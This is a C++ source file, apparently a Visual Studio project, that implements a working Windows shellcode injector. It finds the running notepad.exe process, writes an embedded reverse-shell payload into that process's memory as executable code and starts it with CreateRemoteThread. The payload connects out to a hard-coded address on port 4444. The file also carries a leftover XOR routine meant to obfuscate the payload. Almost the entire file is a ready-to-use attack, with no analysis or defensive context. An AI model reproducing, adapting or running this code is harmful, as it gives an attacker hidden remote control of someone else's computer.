// reverseshell.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>

//#include "Header.h"

#define procAttachName "notepad.exe"

unsigned int bufLen = 510;
unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78"
"\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01\xd3\x50\x8b\x48\x18"
"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac"
"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x7a\x01\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

unsigned char* xorDE(unsigned char* t, unsigned char* k, size_t len) {
    unsigned char* ft = (unsigned char*)malloc(len);
    for (int i = 0; i < len; i++) {
        ft[i] = t[i] ^ 0xFF;
    }
    return ft;
}

int findProcID() {
    // Pulling procName from procAttachName
    wchar_t procName[260];
    size_t procNameConvert;
    PROCESSENTRY32 proc;

    mbstowcs_s(&procNameConvert, procName, procAttachName, strlen(procAttachName));

    proc.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snap == INVALID_HANDLE_VALUE) {
        return -1;
    }

    if (!Process32First(snap, &proc)) {
        return -1;
    }

    while (Process32Next(snap, &proc)) {
        if (wcscmp(proc.szExeFile, procName) == 0) {
            CloseHandle(snap);
            return proc.th32ProcessID;
        }
    }
    return 0;
}

int openRShell(HANDLE rProc) {
    LPVOID addr = NULL;
    HANDLE threadHandle = NULL;
    size_t bWritten;
    
    //unsigned char* bufPT = xorDE(buf, buf_key, bufLen);

    addr = VirtualAllocEx(rProc, NULL, bufLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //WriteProcessMemory(rProc, addr, (PVOID)bufPT, bufLen, &bWritten);
    WriteProcessMemory(rProc, addr, (PVOID)buf, bufLen, &bWritten);
    threadHandle = CreateRemoteThread(rProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);

    if (threadHandle != NULL) {
        return 0;
    }

    return -1;
}

int main() {
    int result;
    result = openRShell(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)findProcID()));
    printf("result: %d\n", result);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
